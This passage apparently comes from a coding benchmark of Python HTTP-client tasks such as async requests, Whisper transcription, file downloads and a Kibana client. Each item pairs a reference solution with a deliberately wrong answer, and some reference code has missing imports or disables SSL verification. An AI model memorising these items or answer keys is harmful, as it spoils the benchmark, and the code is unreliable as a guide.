    "Instruction": "Task Description: Create a Python class that provides asynchronous HTTP client functionality using httpx and asyncio, supporting common HTTP methods (GET, POST), file downloads, and proxy configuration.\n\nClass Description: AsyncHttpx is a utility class for making asynchronous HTTP requests with features like automatic retry on multiple URLs, proxy support, and file downloads. It handles connection timeouts and HTTP errors gracefully.\n\nAttributes:\n- proxy: ClassVar[dict[str, Union[str, None]]] - A class-level dictionary storing proxy configurations for HTTP and HTTPS protocols\n\nMethods:\n- get(url: Union[str, list[str]], *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Performs an asynchronous GET request to one or multiple URLs, returning the first successful response\n- _get_first_successful(urls: list[str], **kwargs) -> Response - Internal method to attempt requests on multiple URLs until first success\n- _get_single(url: str, *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Internal method to perform a single GET request\n- post(url: str, *, data: Optional[dict[str, Any]] = None, content: Any = None, files: Any = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, json: Optional[dict[str, Any]] = None, params: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Performs an asynchronous POST request with various payload options\n- download_file(url: Union[str, list[str]], path: Union[str, Path], *, params: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> bool - Downloads a file from a URL to the specified path, returning success status",
    "Canonical_solution": "import asyncio\nfrom asyncio.exceptions import TimeoutError\nimport httpx\nfrom httpx import ConnectTimeout, HTTPStatusError, Response\nfrom typing import Any, ClassVar, Optional, Union\nfrom pathlib import Path\nimport aiofiles\n\nclass AsyncHttpx:\n    proxy: ClassVar[dict[str, Union[str, None]]] = {\n        \"http://\": None,\n        \"https://\": None,\n    }\n\n    @classmethod\n    async def get(\n        cls,\n        url: Union[str, list[str]],\n        *,\n        params: Optional[dict[str, Any]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        urls = [url] if isinstance(url, str) else url\n        return await cls._get_first_successful(\n            urls,\n            params=params,\n            headers=headers,\n            cookies=cookies,\n            verify=verify,\n            use_proxy=use_proxy,\n            proxy=proxy,\n            timeout=timeout,\n            **kwargs,\n        )\n\n    @classmethod\n    async def _get_first_successful(\n        cls,\n        urls: list[str],\n        **kwargs,\n    ) -> Response:\n        last_exception = None\n        for url in urls:\n            try:\n                return await cls._get_single(url, **kwargs)\n            except Exception as e:\n                last_exception = e\n        raise last_exception or Exception(\"All URLs failed\")\n\n    @classmethod\n    async def _get_single(\n        cls,\n        url: str,\n        *,\n        params: Optional[dict[str, Any]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        _proxy = proxy or (cls.proxy if use_proxy else None)\n        async with httpx.AsyncClient(proxies=_proxy, verify=verify) as client:\n            return await client.get(\n                url,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                timeout=timeout,\n                **kwargs,\n            )\n\n    @classmethod\n    async def post(\n        cls,\n        url: str,\n        *,\n        data: Optional[dict[str, Any]] = None,\n        content: Any = None,\n        files: Any = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        json: Optional[dict[str, Any]] = None,\n        params: Optional[dict[str, str]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        _proxy = proxy or (cls.proxy if use_proxy else None)\n        async with httpx.AsyncClient(proxies=_proxy, verify=verify) as client:\n            return await client.post(\n                url,\n                content=content,\n                data=data,\n                files=files,\n                json=json,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                timeout=timeout,\n                **kwargs,\n            )\n\n    @classmethod\n    async def download_file(\n        cls,\n        url: Union[str, list[str]],\n        path: Union[str, Path],\n        *,\n        params: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> bool:\n        if isinstance(path, str):\n            path = Path(path)\n        path.parent.mkdir(parents=True, exist_ok=True)\n        \n        try:\n            response = await cls.get(\n                url,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                use_proxy=use_proxy,\n                proxy=proxy,\n                timeout=timeout,\n                **kwargs,\n            )\n            response.raise_for_status()\n            async with aiofiles.open(path, \"wb\") as wf:\n                await wf.write(response.content)\n            return True\n        except (TimeoutError, ConnectTimeout, HTTPStatusError) as e:\n            return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport asyncio\nfrom typing import Any, ClassVar, Dict, List, Optional, Union\nfrom pathlib import Path\nfrom httpx import AsyncClient, Response\n\nclass AsyncHttpx:\n    proxy: ClassVar[Dict[str, Optional[str]]] = {'http': None, 'https': None}\n\n    @staticmethod\n    async def get(\n        url: Union[str, List[str]],\n        *,\n        params: Optional[Dict[str, Any]] = None,\n        headers: Optional[Dict[str, str]] = None,\n        cookies: Optional[Dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[Dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs\n    ) -> Response:\n        if isinstance(url, list):\n            return await AsyncHttpx._get_first_successful(url, **kwargs)\n        return await AsyncHttpx._get_single(url, **kwargs)\n\n    @staticmethod\n    async def _get_first_successful(urls: List[str], **kwargs) -> Response:\n        for url in urls:\n            try:\n                return await AsyncHttpx._get_single(url, **kwargs)\n            except Exception as e:\n                print(f\"Failed to fetch {url}: {e}\")\n        raise Exception(\"All URLs failed\")\n\n    @staticmethod\n    async def _get_single(\n        url: str,\n        *,\n        params: Optional[Dict[str, Any]] = None,\n        headers: Optional[Dict[str, str]] = None,\n        cookies: Optional[Dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[Dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs\n    ) -> Response:\n        async with AsyncClient(proxies=proxy or AsyncHttpx.proxy if use_proxy else None, timeout=timeout) as client:\n            return await client.get(url, params=params, headers=headers, cookies=cookies, verify=verify, **kwargs)\n\n    @staticmethod\n    async def post(\n        url: str,\n        *,\n        data: Optional[Dict[str, Any]] = None,\n        content: Any = None,\n        files: Any = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[Dict[str, str]] = None,\n        json: Optional[Dict[str, Any]] = None,\n        params: Optional[Dict[str, str]] = None,\n        headers: Optional[Dict[str, str]] = None,\n        cookies: Optional[Dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs\n    ) -> Response:\n        async with AsyncClient(proxies=proxy or AsyncHttpx.proxy if use_proxy else None, timeout=timeout) as client:\n            return await client.post(url, data=data, content=content, files=files, verify=verify, json=json, params=params, headers=headers, cookies=cookies, **kwargs)\n\n    @staticmethod\n    async def download_file(\n        url: Union[str, List[str]],\n        path: Union[str, Path],\n        *,\n        params: Optional[Dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[Dict[str, str]] = None,\n        headers: Optional[Dict[str, str]] = None,\n        cookies: Optional[Dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs\n    ) -> bool:\n        if isinstance(url, list):\n            response = await AsyncHttpx._get_first_successful(url, **kwargs)\n        else:\n            response = await AsyncHttpx._get_single(url, **kwargs)\n        \n        if response.status_code == 200:\n            with open(path, 'wb') as f:\n                f.write(response.content)\n            return True\n        return False\n```"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Implement a function to send audio data to the Hugging Face Whisper ASR (Automatic Speech Recognition) model API and retrieve the transcribed text.\n\nFunction Description: The function `get_audio_transcript` takes audio data in base64-encoded string format, decodes it, sends it to the Hugging Face Whisper API, and returns the transcribed text. It handles errors and exceptions appropriately, providing feedback if the API request fails.\n\nInput:\n- `ctx`: [Context] - The context object for sending responses or errors back to the caller.\n- `sender`: [str] - Identifier for the sender to direct the response to.\n- `audiodata`: [str] - Base64-encoded string representing the audio data to be transcribed.\n\nOutput:\n- The function does not return a value directly but sends the result or error back through the `ctx` object:\n  - On success: Sends an `AudioTranscriptResponse` containing the transcribed text.\n  - On failure: Sends an `Error` containing the error message from the API or exception details.",
    "Canonical_solution": "import os\nimport requests\nimport base64\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\n\nWHISPER_URL = \"https://api-inference.huggingface.co/models/openai/whisper-large-v2\"\n\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def get_audio_transcript(ctx: Context, sender: str, audiodata: str):\n    try:\n        audiodata = audiodata.encode(\"ascii\")\n        audioBytes = base64.b64decode(audiodata)\n\n        response = requests.post(WHISPER_URL, headers=HEADERS, data=audioBytes)\n\n        if response.status_code != 200:\n            await ctx.send(sender, Error(error=f\"Error: {response.json().get('error')}\"))\n            return\n\n        await ctx.send(sender, AudioTranscriptResponse(transcript=response.json().get('text')))\n        return\n\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception detail: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport base64\nimport requests\n\ndef get_audio_transcript(ctx, sender, audiodata):\n    try:\n        # Decode the base64-encoded audio data\n        audio_bytes = base64.b64decode(audiodata)\n        \n        # Prepare the request payload\n        files = {'file': ('audio.wav', audio_bytes, 'audio/wav')}\n        \n        # Send the request to the Hugging Face Whisper API\n        response = requests.post('https://api-inference.huggingface.co/models/openai/whisper-base', files=files, headers={'Authorization': 'Bearer YOUR_API_TOKEN'})\n        \n        # Check if the request was successful\n        response.raise_for_status()\n        \n        # Parse the JSON response\n        transcription = response.json()[0]['transcription']\n        \n        # Send the transcription response back through the context\n        ctx.send(AudioTranscriptResponse(sender, transcription))\n    \n    except requests.exceptions.RequestException as e:\n        # Handle any exceptions that occur during the request\n        ctx.send(Error(sender, f\"Failed to transcribe audio: {str(e)}\"))\n    except Exception as e:\n        # Handle any other unexpected exceptions\n        ctx.send(Error(sender, f\"An error occurred: {str(e)}\"))\n```"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Python class that interacts with the Play.ht API to synthesize text into speech and return the audio as an AudioSegment object.\n\nClass Description: The PlayHtSynthesizer class provides functionality to convert text to speech using the Play.ht API. It handles API authentication, request construction, and response processing to return audio in a usable format.\n\nAttributes:\n- voice: str - The voice identifier to be used for speech synthesis\n- sample_rate: int - The audio sample rate (default: 24000)\n- speed: Optional[float] - The playback speed of the synthesized speech\n- preset: Optional[str] - The voice preset to use\n- api_key: Optional[str] - The API key for Play.ht authentication\n- user_id: Optional[str] - The user ID for Play.ht authentication\n- tts_endpoint: str - The API endpoint for text-to-speech synthesis (default: \"https://play.ht/api/v2/tts/stream\")\n\nMethods:\n- __init__(voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None) -> None - Initializes the synthesizer with configuration parameters\n- synthesize(text: str) -> AudioSegment - Converts the input text to speech using the Play.ht API and returns the audio as an AudioSegment object",
    "Canonical_solution": "import io\nfrom typing import Optional\nimport requests\nfrom pydub import AudioSegment\n\nclass PlayHtSynthesizer:\n    def __init__(\n        self,\n        voice: str,\n        sample_rate: int = 24000,\n        speed: Optional[float] = None,\n        preset: Optional[str] = None,\n        api_key: Optional[str] = None,\n        user_id: Optional[str] = None,\n    ):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"X-User-ID\": self.user_id,\n            \"Accept\": \"audio/mpeg\",\n            \"Content-Type\": \"application/json\",\n        }\n        body = {\n            \"voice\": self.voice,\n            \"text\": text,\n            \"sample_rate\": self.sample_rate,\n        }\n        if self.speed is not None:\n            body[\"speed\"] = self.speed\n        if self.preset is not None:\n            body[\"preset\"] = self.preset\n\n        response = requests.post(self.tts_endpoint, headers=headers, json=body, timeout=5)\n        if not response.ok:\n            raise Exception(f\"Play.ht API error: {response.status_code}, {response.text}\")\n\n        return AudioSegment.from_mp3(io.BytesIO(response.content))",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom pydub import AudioSegment\nfrom typing import Optional\n\nclass PlayHtSynthesizer:\n    def __init__(self, voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None) -> None:\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"x-user-id\": self.user_id,\n            \"Content-Type\": \"application/json\"\n        }\n        payload = {\n            \"voice\": self.voice,\n            \"text\": text,\n            \"sample_rate\": self.sample_rate\n        }\n        if self.speed is not None:\n            payload[\"speed\"] = self.speed\n        if self.preset is not None:\n            payload[\"preset\"] = self.preset\n\n        response = requests.post(self.tts_endpoint, json=payload, headers=headers, stream=True)\n        response.raise_for_status()\n\n        audio_bytes = b\"\"\n        for chunk in response.iter_content(chunk_size=1024):\n            if chunk:\n                audio_bytes += chunk\n\n        return AudioSegment.from_file(io.BytesIO(audio_bytes), format=\"mp3\")\n```"
  },
  {
    "Task_id": 60,
    "Instruction": "Task Description: Create a Python module for handling HTTP client operations including login, check-in, and logout functionalities with support for retries and optional proxy usage.\n\nFunction Description: The module provides three main functions for HTTP interactions:\n1. `login`: Performs a POST request to authenticate with a service\n2. `checkin`: Performs a POST request to check in/register with a service\n3. `logout`: Performs a GET request to terminate a session\n\nInput:\n- For `login`:\n  - url: str - The endpoint URL for login\n  - params: dict - The login credentials/data to send\n  - headers: dict - HTTP headers for the request\n  - retry: int - Number of retry attempts\n  - proxy: bool - Whether to use proxy (default False)\n\n- For `checkin`:\n  - url: str - The endpoint URL for check-in\n  - headers: dict - HTTP headers for the request\n  - retry: int - Number of retry attempts\n  - proxy: bool - Whether to use proxy (default False)\n\n- For `logout`:\n  - url: str - The endpoint URL for logout\n  - headers: dict - HTTP headers for the request\n\nOutput:\n- For `login`: dict - Returns response headers (lowercased keys) if successful, empty dict otherwise\n- For `checkin`: None - Logs success/failure messages\n- For `logout`: int - Returns 0 on success, -3 on failure",
    "Canonical_solution": "import logging\nimport requests\nimport simplejson as json\nfrom requests.exceptions import RequestException\nfrom simplejson.decoder import JSONDecodeError\n\nHEADER = {\n    \"user-agent\": \"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3803.0 Mobile Safari/537.36\",\n    \"accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"accept-language\": \"zh-CN,zh;q=0.9\",\n    \"dnt\": \"1\",\n    \"Connection\": \"keep-alive\",\n    \"content-type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\n    \"x-requested-with\": \"XMLHttpRequest\",\n}\n\nPROXY = {\"http\": \"http://127.0.0.1:1080\", \"https\": \"http://127.0.0.1:1080\"}\n\ndef login(url, params, headers, retry, proxy=False) -> dict:\n    try:\n        if proxy:\n            response = requests.post(\n                url,\n                data=params,\n                headers=headers,\n                allow_redirects=True,\n                proxies=PROXY,\n                verify=False,\n            )\n        else:\n            response = requests.post(url, data=params, headers=headers, allow_redirects=True)\n\n        if response.status_code == 200:\n            return {str(key).lower(): value for key, value in response.headers.items()}\n        return {}\n\n    except RequestException as e:\n        logging.error(str(e))\n        retry -= 1\n\n        if retry > 0:\n            time.sleep(get_randint(30 * 60, 90 * 60))\n            return login(url, params, headers, retry, proxy)\n\n        logging.error(\"\u767b\u5f55\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n        return {}\n\ndef checkin(url, headers, retry, proxy=False) -> None:\n    try:\n        response = (\n            requests.post(url, headers=headers, proxies=PROXY, verify=False)\n            if proxy\n            else requests.post(url, headers=headers)\n        )\n\n        if response.status_code == 200:\n            key = \"Content-Encoding\"\n            try:\n                data = (\n                    json.loads(brotli.decompress(response.content).decode(\"utf-8\"))\n                    if key in response.headers and response.headers[\"Content-Encoding\"] == \"br\"\n                    else response.json()\n                )\n\n                logging.info(\"\u7b7e\u5230\u6210\u529f URL: {} {}\".format(extract_domain(url), data[\"msg\"]))\n            except JSONDecodeError:\n                logging.error(\"\u7b7e\u5230\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n\n    except RequestException as e:\n        logging.error(str(e))\n        retry -= 1\n\n        if retry > 0:\n            time.sleep(get_randint(30, 60 * 60))\n            return checkin(url, headers, retry, proxy)\n\n        logging.error(\"\u7b7e\u5230\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n\ndef logout(url, headers) -> int:\n    try:\n        response = requests.get(url, headers=headers)\n        if response.status_code == 200:\n            return 0\n        else:\n            logging.info(\"\u9000\u51fa\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n            return -3\n    except RequestException:\n        return -3",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom requests.adapters import HTTPAdapter\nfrom requests.packages.urllib3.util.retry import Retry\n\ndef login(url, params, headers, retry=3, proxy=False):\n    session = requests.Session()\n    retries = Retry(total=retry, backoff_factor=1, status_forcelist=[500, 502, 503, 504])\n    session.mount('http://', HTTPAdapter(max_retries=retries))\n    session.mount('https://', HTTPAdapter(max_retries=retries))\n    \n    try:\n        response = session.post(url, json=params, headers=headers, proxies={'http': 'http://proxy.example.com:8080', 'https': 'https://proxy.example.com:8080'} if proxy else None)\n        if response.status_code == 200:\n            return {k.lower(): v for k, v in response.headers.items()}\n        else:\n            return {}\n    except requests.RequestException as e:\n        print(f\"Login failed: {e}\")\n        return {}\n\ndef checkin(url, headers, retry=3, proxy=False):\n    session = requests.Session()\n    retries = Retry(total=retry, backoff_factor=1, status_forcelist=[500, 502, 503, 504])\n    session.mount('http://', HTTPAdapter(max_retries=retries))\n    session.mount('https://', HTTPAdapter(max_retries=retries))\n    \n    try:\n        response = session.post(url, headers=headers, proxies={'http': 'http://proxy.example.com:8080', 'https': 'https://proxy.example.com:8080'} if proxy else None)\n        if response.status_code == 200:\n            print(\"Check-in successful\")\n        else:\n            print(f\"Check-in failed with status code: {response.status_code}\")\n    except requests.RequestException as e:\n        print(f\"Check-in failed: {e}\")\n\ndef logout(url, headers):\n    session = requests.Session()\n    \n    try:\n        response = session.get(url, headers=headers)\n        if response.status_code == 200:\n            return 0\n        else:\n            return -3\n    except requests.RequestException as e:\n        print(f\"Logout failed: {e}\")\n        return -3"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local path.\n\nFunction Description: The function uses the Python requests library to make an HTTP GET request to download a file from a provided URL. It checks the response status code to ensure the request was successful, creates necessary directories for the local path if they don't exist, and saves the file content to the specified location.\n\nInput:\n- url: str - The URL of the file to download\n- local_path: str - The local file path where the downloaded content should be saved\n\nOutput:\n- None - The function doesn't return any value but prints status messages indicating success or failure of the download operation",
    "Canonical_solution": "import os\nimport requests\nfrom urllib.parse import urljoin\n\ndef download_file(url, local_path):\n    response = requests.get(url)\n    if response.status_code == 200:\n        os.makedirs(os.path.dirname(local_path), exist_ok=True)\n        with open(local_path, 'wb') as f:\n            f.write(response.content)\n        print(f\"Downloaded: {local_path}\")\n    else:\n        print(response.status_code)\n        print(f\"Failed to download: {url}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\n\ndef download_file(url, local_path):\n    try:\n        response = requests.get(url)\n        response.raise_for_status()  # Raises an HTTPError for bad responses\n\n        # Ensure the directory exists\n        os.makedirs(os.path.dirname(local_path), exist_ok=True)\n\n        # Write the content to the file\n        with open(local_path, 'wb') as file:\n            file.write(response.content)\n        \n        print(f\"File downloaded successfully and saved to {local_path}\")\n    \n    except requests.exceptions.HTTPError as http_err:\n        print(f\"HTTP error occurred: {http_err}\")\n    except Exception as err:\n        print(f\"An error occurred: {err}\")"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local folder.\n\nFunction Description: The function downloads a file from the provided URL using HTTP GET request and saves it to the specified folder. It handles folder creation if it doesn't exist and provides feedback on the download status.\n\nInput:\n- url: str - The URL of the file to download\n- folder_path: str - The local directory path where the file should be saved\n\nOutput:\n- None - The function doesn't return any value but saves the file to disk and prints status messages",
    "Canonical_solution": "import os\nimport requests\n\ndef download_file(url: str, folder_path: str) -> None:\n    # Create the folder if it doesn't exist\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n\n    # Extract filename from URL\n    filename = url.split(\"/\")[-1]\n\n    # Define path to save the file\n    file_path = os.path.join(folder_path, filename)\n\n    # Send a GET request to the URL\n    response = requests.get(url)\n\n    # Check if request was successful (status code 200)\n    if response.status_code == 200:\n        # Save the file to the specified folder\n        with open(file_path, \"wb\") as f:\n            f.write(response.content)\n        print(f\"File downloaded successfully to {file_path}\")\n    else:\n        print(f\"Failed to download file. Status code: {response.status_code}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef download_file(url, folder_path):\n    # Ensure the folder exists\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n    \n    # Extract the file name from the URL\n    file_name = url.split('/')[-1]\n    file_path = os.path.join(folder_path, file_name)\n    \n    try:\n        # Send a GET request to the URL\n        response = requests.get(url, stream=True)\n        response.raise_for_status()  # Raise an error for bad responses\n        \n        # Write the content to a file\n        with open(file_path, 'wb') as file:\n            for chunk in response.iter_content(chunk_size=8192):\n                file.write(chunk)\n        \n        print(f\"File downloaded successfully: {file_path}\")\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to download file: {e}\")\n\n# Example usage:\n# download_file('https://example.com/file.zip', '/path/to/save')\n```"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Python class that serves as an HTTP client for interacting with Kibana and Elasticsearch APIs, handling authentication, requests, and responses for various operations.\n\nClass Description: The KibanaHTTPClient class provides methods to interact with Kibana's saved objects and Elasticsearch's templates through HTTP requests. It handles authentication, SSL verification, and response parsing.\n\nAttributes:\n- username: str - The username for authentication (default: \"redelk\")\n- password: str - The password for authentication (default: None)\n- verify_ssl: bool - Flag to enable/disable SSL verification (default: False)\n- scheme: str - The URL scheme (default: \"https\")\n- kibana_url: str - The base URL for Kibana API (default: \"https://localhost:5601\")\n- es_url: str - The base URL for Elasticsearch API (default: \"https://localhost:9200\")\n- headers: dict - HTTP headers including \"kbn-xsrf\" for Kibana requests\n\nMethods:\n- fetch_kibana_object(obj_type: str) -> list - Fetches Kibana saved objects of specified type by making a POST request to Kibana's export API. Returns parsed NDJSON response.\n- fetch_es_template(template_name: str) -> dict - Retrieves an Elasticsearch template by name via GET request. Returns parsed JSON response.\n- fetch_es_component_templates() -> dict - Gets all Elasticsearch component templates via GET request. Returns parsed JSON response.\n- fetch_es_index_templates() -> dict - Retrieves all Elasticsearch index templates via GET request. Returns parsed JSON response.",
    "Canonical_solution": "import requests\nimport json\nimport ndjson\nimport os\nimport re\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = \"https\"\n        self.kibana_url = f\"{self.scheme}://localhost:5601\"\n        self.es_url = f\"{self.scheme}://localhost:9200\"\n        self.headers = {\"kbn-xsrf\": \"true\"}\n\n    def fetch_kibana_object(self, obj_type):\n        try:\n            response = requests.post(\n                f\"{self.kibana_url}/api/saved_objects/_export\",\n                json={\"type\": obj_type},\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n                headers=self.headers,\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return ndjson.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching kibana object {obj_type}: {error}\")\n\n    def fetch_es_template(self, template_name):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_template/{template_name}\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return json.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching ES template {template_name}: {error}\")\n\n    def fetch_es_component_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_component_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES component templates: {error}\")\n\n    def fetch_es_index_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_index_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES index templates: {error}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport json\nfrom ndjson import loads\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False, scheme=\"https\", kibana_url=\"https://localhost:5601\", es_url=\"https://localhost:9200\"):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = scheme\n        self.kibana_url = kibana_url\n        self.es_url = es_url\n        self.headers = {\n            \"kbn-xsrf\": \"true\",\n            \"Content-Type\": \"application/json\"\n        }\n\n    def _make_request(self, url, method=\"GET\", data=None):\n        auth = (self.username, self.password) if self.username and self.password else None\n        response = requests.request(method, url, headers=self.headers, data=data, auth=auth, verify=self.verify_ssl)\n        response.raise_for_status()\n        return response\n\n    def fetch_kibana_object(self, obj_type: str) -> list:\n        url = f\"{self.kibana_url}/api/saved_objects/_export\"\n        data = json.dumps({\"type\": [obj_type]})\n        response = self._make_request(url, method=\"POST\", data=data)\n        return loads(response.text)\n\n    def fetch_es_template(self, template_name: str) -> dict:\n        url = f\"{self.es_url}/_template/{template_name}\"\n        response = self._make_request(url)\n        return response.json()\n\n    def fetch_es_component_templates(self) -> dict:\n        url = f\"{self.es_url}/_component_template\"\n        response = self._make_request(url)\n        return response.json()\n\n    def fetch_es_index_templates(self) -> dict:\n        url = f\"{self.es_url}/_index_template\"\n        response = self._make_request(url)\n        return response.json()\n```"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a function to download financial market data from a specific API endpoint, handling authentication, progress tracking, and error checking during the download process.\n\nFunction Description: The function downloads compressed CSV data from a REST API endpoint for a given exchange, data type, symbol, and date. It streams the download to efficiently handle large files, shows progress using a progress bar, verifies the download completeness, and saves the data to a specified file path. The function includes proper error handling for failed requests or incomplete downloads.\n\nInput:\n- exchange: [str] - The financial exchange identifier (e.g., 'binance')\n- data_type: [str] - The type of market data to download (e.g., 'trades')\n- symbol: [str] - The trading symbol/pair (e.g., 'BTCUSDT')\n- yyyymmdd: [int/str] - The date in YYYYMMDD format\n- filepath: [str] - The local path where the downloaded file should be saved\n- key: [str] - The API authorization key (Bearer token)\n\nOutput:\n- None - The function doesn't return anything but saves the downloaded data to the specified file path\n- Raises RuntimeError if the download fails (either due to HTTP error or incomplete download)",
    "Canonical_solution": "import json\nimport os.path\nimport requests\nfrom datetime import datetime, timedelta\nfrom tqdm import tqdm\n\ndef download(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    yyyymmdd = str(yyyymmdd)\n    url = f'https://datasets.tardis.dev/v1/{exchange}/{data_type}/{yyyymmdd[:4]}/{yyyymmdd[4:6]}/{yyyymmdd[6:]}/{symbol}.csv.gz'\n\n    response = requests.get(url, stream=True, headers={'Authorization': f'Bearer {key}'})\n    if response.status_code != 200:\n        raise RuntimeError('Could not download file')\n\n    total_size = int(response.headers.get('content-length', 0))\n    block_size = 1024\n\n    with tqdm(total=total_size, unit='B', unit_scale=True) as progress_bar:\n        with open(filepath, 'wb') as file:\n            for data in response.iter_content(block_size):\n                progress_bar.update(len(data))\n                file.write(data)\n\n    if total_size != 0 and progress_bar.n != total_size:\n        raise RuntimeError('Could not download file')",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
